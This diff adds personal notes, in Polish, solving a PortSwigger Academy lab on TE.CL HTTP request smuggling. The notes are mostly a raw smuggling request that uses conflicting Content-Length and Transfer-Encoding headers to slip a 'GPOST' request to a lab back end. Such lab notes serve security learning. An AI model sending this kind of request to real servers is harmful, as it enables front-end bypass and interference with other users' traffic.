@@ -1,0 +1,33 @@
+(https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl)
+
+To laboratorium obejmuje serwer frontonu i serwera zaplecza, a serwer zaplecza nie obsługuje kodowania fragmentarycznego. Serwer frontonu odrzuca 
+żądania, które nie używają metody GET ani POST.
+
+Aby rozwiązać laboratorium, przemytuj żądanie do serwera zaplecza, aby następne żądanie przetworzone przez serwer zaplecza wydawało się używać 
+metody GPOST.
+
+
+Ręczne naprawianie pól długości w atakach polegających na przemycie żądań może być trudne. Nasze rozszerzenie HTTP Request Smuggler Burp zostało 
+zaprojektowane, aby pomóc. Możesz go zainstalować za pośrednictwem BApp Store.
+
+
+[Request] - musza byc 2x[enter] na koncu
+POST / HTTP/1.1
+Host: 0a6c0029049cd0d4c09d0b93002900f5.web-security-academy.net
+Cookie: session=xMd9w176qpVCRCIRBTnCcCuPl6Xkf5Xf
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+
+[/Request]
